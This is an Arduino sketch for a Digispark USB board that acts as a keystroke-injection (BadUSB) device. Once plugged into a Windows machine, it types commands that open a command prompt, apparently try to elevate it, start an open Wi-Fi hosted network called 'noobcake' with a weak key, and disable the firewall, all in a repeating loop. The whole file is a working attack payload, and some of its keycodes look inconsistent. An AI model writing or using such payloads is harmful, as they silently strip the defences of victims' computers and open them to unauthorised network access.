#include "DigiKeyboard.h"
void setup(){}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(41, null);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(128);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("a");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("netsh wlan set hostednetwork mode=allow ssid=noobcake key=123456789");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("netsh wlan start hostednetwork");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("netsh firewall set opmode disable");
  DigiKeyboard.sendKeyStroke(40);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(40);
}
